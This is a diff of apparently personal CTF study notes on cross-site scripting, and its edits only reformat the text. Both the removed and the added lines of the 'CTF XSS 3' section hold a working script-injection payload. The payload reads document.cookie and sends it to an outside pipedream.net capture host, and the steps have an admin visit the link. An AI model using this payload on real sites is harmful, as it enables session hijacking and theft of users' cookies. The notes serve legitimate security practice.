@@ -43,7 +43,7 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
 7. DOM Based XSS
 - Create a tag by using JavaScript
 - Create and execute a new script from a browser
-- an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim's browser used by the original client side script,
+- an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim's browser used by the original client-side script,
 - document.write = "";
 - innerHTML
 
@@ -60,12 +60,12 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
   - Check the flag on https://public.requestbin.com/
 
  b. CTF XSS 3
-    - Error = Showing ID on the URL on the personal information 
-    - Check the attack possibility to change the ID on Burp Suite Request
-    - Check the attack statement => aaa"/><script>alert(1)</script>
-    - Check the attack => aaa"/><script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
-    - Copy GET URL and input the URL on the admin visit bar
-    - Check the flag on https://public.requestbin.com/
+  - Error = Showing ID on the URL on the personal information 
+  - Check the attack possibility to change the ID on Burp Suite Request
+  - Check the attack statement => aaa"/><script>alert(1)</script>
+  - Check the attack => aaa"/><script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
+  - Copy GET URL and input the URL on the admin visit bar
+  - Check the flag on https://public.requestbin.com/
 
   c. CTF XSS 4
     - Error = In the board, it is possible to use special characters (<'">).
